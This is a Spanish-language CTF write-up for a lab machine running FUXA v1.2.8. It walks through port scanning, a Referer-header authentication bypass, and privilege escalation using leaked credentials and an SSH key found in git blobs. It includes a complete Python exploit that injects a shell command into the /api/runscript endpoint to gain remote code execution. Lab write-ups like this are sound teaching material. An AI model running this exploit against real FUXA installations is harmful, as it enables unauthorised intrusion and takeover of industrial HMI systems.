![alt text](img/image.png)

# Contexto
![alt text](img/image-1.png)

# Enumeracion y analisis
## arp-scan
Primero identificamos a nuestra maquina objetivo.

![alt text](img/image-2.png)

## ping 

Verificamos si tenemos alcance a la maquina.

![alt text](img/image-3.png)

## nmap 

Buscamos que puertos estan abiertos.

![alt text](img/image-4.png)

obtenermos los puerto 22, 80, 1881 hacemos un escaneamos para verificar que servicios corren en estos puertos.

![alt text](img/image-5.png)

Obtenemos los servicios ssh y  http.

### port 80

#### whatweb 

Verificamos que tecnologias corren en este servicio http.

![alt text](img/image-6.png)

Concluimos que esta corriendo apache 2.5.66 y que acepta los metodos GET,PUT,POST,DELETE,OPTIONS. Visualizamos como se ve en el navegador.

![alt text](img/image-11.png)

#### gobuster 

Hacemos fuzz para encontrar endpoints.

![alt text](img/image-8.png)

Notamos que al no encontrar un endpoint devuelve un **codigo 401** y no un  404, tambien que siempre devuelve una longitud de 67. 
Por el momento resolvemos el problema de la longitud para hacer fuzz.

![alt text](img/image-9.png)

Esos son los endpoints que obtuvimos. Revisemos el puerto 1881.

### port 1881

#### whatweb

![alt text](img/image-10.png) 

![alt text](img/image-7.png)

#### gobuster 

![alt text](img/image-12.png)

obtenemos los mismo resultados en ambos puertos.
Revisamos el contenido que nos proporciona el **codigo 401**.

![alt text](img/image-13.png)

La aplicacion tiene un panel login pero despues de buscar credencial y tratar de usar sqli se concluye que hay que buscar un bypass para saltarse el codigo 401.

Busque el titulo de la pagina con searchsploit y me salio un exploit pero este no funciona , pero me dio la idea de buscar la version de **fuxa** y de casualidad la encontre.

![alt text](img/image-15.png)

![alt text](img/image-14.png)

Tenemos un **"FUXA V1.2.8-2638"** asi que buscamos un exploit en internet.

Encontramos este https://www.exploit-db.com/exploits/52544. 

![alt text](img/image-16.png)

El exploit como tal no funciona pero si te da una forma de bypass ademas de endpoints de **api**.

![alt text](img/image-17.png)

![alt text](img/image-20.png)

Es decir se puede hacer bypass con el campo **"Referer: http://URL_OBJETIVO/fuxa"**

asi:

![alt text](img/image-18.png)

pero nos redirige al dashboard:

![alt text](img/image-19.png)

Intentamos fuzzear nuevamente pero nos devuelvo los mismos endpoints que encontramos previamente.

Recordemos que el exploit nos mostraba endpoints de api, hacemos fuzz buscando mas endpoinds relacionados con api.

![alt text](img/image-21.png)

Revisamos el contenido de esto endpoints.

![alt text](img/image-22.png)

vemos que el contenido de **'/api/project'** es muy extenso, la parte que mas nos interesa y se relaciona con el exploit anterior es la siguiente.

![alt text](img/image-23.png)

Entonces, el exploit que encontramos previamente intentaba insertar codigo js para hacer el RCE pero no tiene exito, la clave de esta maquina era aprovechar los scripts existentes.

gran parte del siguiente script fue sacado de aqui https://github.com/setyanoegraha/hackmyvm-writeups/blob/main/machines/fuxa/fuxa.md  ya que leyendo el script me di cuenta que no habia que insertar codigo js al sistema sino aprovechar el script existe en el sistema.

    import requests
    import urllib3
    import json

    urllib3.disable_warnings()

    url = "http://IP_OBJETIVO/api/runscript"

    injection = '$( COMANDO_A_EJECUTAR >&2)'

    payload = {
    'headers': {
    'normalizedNames': {},
    'lazyUpdate': None,
    'lazyInit': None
    },
    'params': {
    'script': {
    'id': 's_maint_preview_bundle',
    'name': 'asset_cache_preview',
    'code': 'placeholder',
    'sync': False,
    'parameters': [{
    'name': 'pattern',
    'type': 'value',
    'value': injection
    }],
    'permission': None,
    'mode': 'SERVER'
    },
    'toLogEvent': False
    }
    }

    try:
    r = requests.post(
    url,
    headers={
    "Content-Type": "application/json",
    "Referer": "http://IP_OBJETIVO/fuxa"
    },
    json=payload,
    timeout=30,
    verify=False
    )

    print("Status:", r.status_code)
    print("Content-Type:", r.headers.get("Content-Type"))

    try:
    data = r.json()

    print("Response type:", type(data).__name__)

    if isinstance(data, dict):
    print("STDOUT:", data.get("stdout", ""))
    print("STDERR:", data.get("stderr", ""))
    print("Response:", json.dumps(data, indent=4))
    else:
    print("Response:", data)

    except ValueError:
    print("Respuesta no JSON:")
    print(r.text)

    except requests.RequestException as e:
    print("Error HTTP:", e)


Ejecutamos el comando **"id"** y vemos que tiene efecto.

![alt text](img/image-24.png)

Ahora ejecutamos una revershell.

![alt text](img/image-25.png)

# Escalada de www-data a git

Nos pasamos el **"pspy64"** a nuestra maquina objetivo para ver procesos que se ejecutan automaticamente.

![alt text](img/image-26.png)

## pspy

La parte mas importante es esta linea que ejecuta este archivo **"/opt/fuxa/FUXA/server/scripts/local-sync.sh"**.

![alt text](img/image-27.png)

Dentro del script obtenemos credenciales.

![alt text](img/image-28.png)

y podemos ver la bandera.

![alt text](img/image-29.png)

![alt text](img/image-30.png)

# Escalada de git a root

El archivo anterior estaba dentro de una carpeta que me llamo la atencion **/opt**. asi que revisamos esta carpeta.

![alt text](img/image-31.png)

la carpeta que nos interesa es **'.cache-loader'**.

![alt text](img/image-32.png)

Despues de darle vueltas y vueltas , resulta que la carpeta **state** tiene una estructura de carpetas similar a un repositorio de git mas especifico a la de la carpeta **".git"**.

ya que esta carpeta solo es un pedaso de un repositorio de git el comando git no la detecta para esto se tiene que especificar usando variables de entorno.

revisamos si hay commits.

![alt text](img/image-33.png)

No tenemos commits, recordemos que git no guarda archivos como tal sino guarda objetos uno de esos objetos es **commit** otro es **tag** y otro es **blob** https://www.graphapp.ai/engineering-glossary/git/git-object-types-blob-tree-commit-tag .

Asi que revisamos si hay blob.

![alt text](img/image-34.png)

Vemos una key ssh revisamos de quien es.

![alt text](img/image-35.png)

La guardamos y nos conectamos con ssh.

![alt text](img/image-36.png)

y podemos ver la bandera.

![alt text](img/image-37.png)